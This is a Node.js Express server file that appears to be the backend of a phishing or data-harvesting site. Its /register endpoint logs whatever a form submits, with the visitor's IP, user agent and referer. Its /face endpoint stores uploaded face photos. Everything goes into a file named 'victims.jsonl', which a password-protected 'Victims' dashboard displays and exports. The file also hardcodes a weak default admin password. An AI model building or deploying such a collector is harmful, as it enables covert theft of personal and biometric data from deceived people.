const express = require('express');
const multer  = require('multer');
const path    = require('path');
const fs      = require('fs');
const auth    = require('basic-auth');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOAD_DIR = path.join(__dirname, 'uploads');
const DATA_DIR   = path.join(__dirname, 'data');
const LOG_FILE   = path.join(DATA_DIR, 'victims.jsonl');
fs.mkdirSync(UPLOAD_DIR, { recursive: true });
fs.mkdirSync(DATA_DIR,   { recursive: true });

const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'changeme123';

function requireAuth(req, res, next) {
  const u = auth(req);
  if (!u || u.name !== ADMIN_USER || u.pass !== ADMIN_PASS) {
    res.set('WWW-Authenticate', 'Basic realm="admin"');
    return res.status(401).send('Auth required');
  }
  next();
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => {
    const ip = getClientIP(req).replace(/[^0-9a-f:.]/gi, '');
    cb(null, `${Date.now()}_${ip}_${Math.random().toString(36).slice(2)}.jpg`);
  }
});
const upload = multer({ storage, limits: { fileSize: 15 * 1024 * 1024 } });

app.set('trust proxy', true);
app.use(express.json({ limit: '3mb' }));

function getClientIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
      || req.socket.remoteAddress;
}

app.use(express.static(path.join(__dirname, 'public')));

app.post('/register', (req, res) => {
  const rec = {
    time: new Date().toISOString(),
    ip: getClientIP(req),
    ua: req.headers['user-agent'],
    ref: req.headers['referer'],
    data: req.body
  };
  fs.appendFileSync(LOG_FILE, JSON.stringify(rec) + '\n');
  console.log('📝', rec.ip);
  res.json({ ok: true });
});

app.post('/face', upload.single('photo'), (req, res) => {
  if (!req.file) return res.status(400).json({ ok: false });
  fs.appendFileSync(LOG_FILE, JSON.stringify({
    time: new Date().toISOString(),
    ip: getClientIP(req),
    ua: req.headers['user-agent'],
    face: req.file.filename
  }) + '\n');
  console.log('📸', req.file.filename);
  res.json({ ok: true });
});

app.get('/admin', requireAuth, (req, res) => {
  const lines = fs.existsSync(LOG_FILE)
    ? fs.readFileSync(LOG_FILE, 'utf8').trim().split('\n').filter(Boolean)
    : [];
  const records = lines.map(l => { try { return JSON.parse(l); } catch { return null; } })
                       .filter(Boolean).reverse();

  const rows = records.map((r, i) => {
    const photo = r.face
      ? `<img src="/admin/photo/${r.face}" style="width:80px;border-radius:6px;cursor:pointer" onclick="window.open(this.src)">`
      : '—';
    return `<tr>
      <td>${i+1}</td>
      <td>${r.time || ''}</td>
      <td>${r.ip || ''}</td>
      <td>${photo}</td>
      <td><pre style="white-space:pre-wrap;max-width:500px;font-size:11px">${JSON.stringify(r.data || r, null, 1)}</pre></td>
    </tr>`;
  }).join('');

  res.send(`<!DOCTYPE html><html><head><meta charset="utf-8"><title>Dashboard</title>
  <style>
    body{font-family:monospace;background:#0d1117;color:#eee;padding:20px}
    table{border-collapse:collapse;width:100%}
    th,td{border:1px solid #30363d;padding:8px;text-align:left;font-size:12px;vertical-align:top}
    th{background:#161b22;position:sticky;top:0}
    a{color:#58a6ff}
  </style></head><body>
  <h2>Victims (${records.length}) — <a href="/admin/export">export JSON</a></h2>
  <table><thead><tr><th>#</th><th>Time</th><th>IP</th><th>Photo</th><th>Data</th></tr></thead>
  <tbody>${rows}</tbody></table></body></html>`);
});

app.get('/admin/photo/:name', requireAuth, (req, res) => {
  const f = path.join(UPLOAD_DIR, path.basename(req.params.name));
  if (!fs.existsSync(f)) return res.status(404).send('not found');
  res.sendFile(f);
});

app.get('/admin/export', requireAuth, (req, res) => {
  if (!fs.existsSync(LOG_FILE)) return res.json([]);
  res.type('application/json').send(fs.readFileSync(LOG_FILE, 'utf8'));
});

app.get('/health', (req, res) => res.json({ ok: true, t: Date.now() }));

app.listen(PORT, () => console.log(`🌐 http://localhost:${PORT}`));
